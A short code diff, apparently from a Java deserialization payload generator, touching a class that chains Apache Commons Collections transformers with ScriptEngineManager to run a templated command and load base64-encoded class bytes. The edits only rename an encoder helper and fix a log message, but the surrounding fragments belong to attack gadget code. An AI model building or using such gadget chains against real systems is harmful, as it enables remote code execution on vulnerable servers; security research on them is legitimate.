@@ -5,7 +5,7 @@ import com.ppp.JavaClassHelper;
 import com.ppp.Printer;
 import com.ppp.sinks.annotation.EnchantType;
 import com.ppp.sinks.annotation.Sink;
-import com.ppp.utils.maker.Encoder;
+import com.ppp.utils.maker.CryptoProcessor;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InstantiateTransformer;
@@ -112,7 +112,7 @@ public class InvokerTransformer3 {
         // 模板替换 -cmd -> [ppp]
         code = code.replaceAll("\\[ppp\\]", command);
 
-        Printer.greenInfo(String.format("js code is %s: ", code));
+        Printer.greenInfo(String.format("js code is: %s", code));
 
         return new Transformer[]{
                 new ConstantTransformer(ScriptEngineManager.class),
@@ -324,7 +324,7 @@ public class InvokerTransformer3 {
             /**
              * javax.script.ScriptEngineManager
              */
-            String b64 = Encoder.base64encoder(classBytes);
+            String b64 = CryptoProcessor.base64encoder(classBytes);
 
             String code = "var data=\"" + b64 + "\";\n" +
                     "var aClass = java.lang.Class.forName(\"sun.misc.BASE64Decoder\");\n" +
